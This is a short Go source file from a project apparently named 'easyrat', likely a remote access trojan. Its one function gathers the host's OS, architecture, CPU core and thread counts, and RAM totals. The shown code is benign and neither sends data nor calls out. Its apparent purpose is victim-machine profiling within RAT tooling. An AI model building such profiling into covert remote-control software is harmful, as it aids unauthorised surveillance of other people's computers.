package modules

import (
	"easyrat/utils/types"
	"fmt"
	"runtime"

	"github.com/jaypipes/ghw"
)

func DeviceInfo() types.DeviceInfoStruct {
	dev_info := types.DeviceInfoStruct{}

	// OS information
	dev_info.OSName = runtime.GOOS
	dev_info.Arch = runtime.GOARCH

	// CPU Information
	cpu, err := ghw.CPU()
	if err != nil {
		fmt.Printf("Error getting CPU info: %v", err)
	}

	dev_info.CPUCores = cpu.TotalCores
	dev_info.CPUThreads = cpu.TotalThreads

	// RAM Information
	memory, err := ghw.Memory()
	if err != nil {
		fmt.Printf("Error getting RAM info: %v", err)
	}
	dev_info.RAMUsable = memory.TotalUsableBytes
	dev_info.RAMPhysical = memory.TotalPhysicalBytes

	return dev_info
}
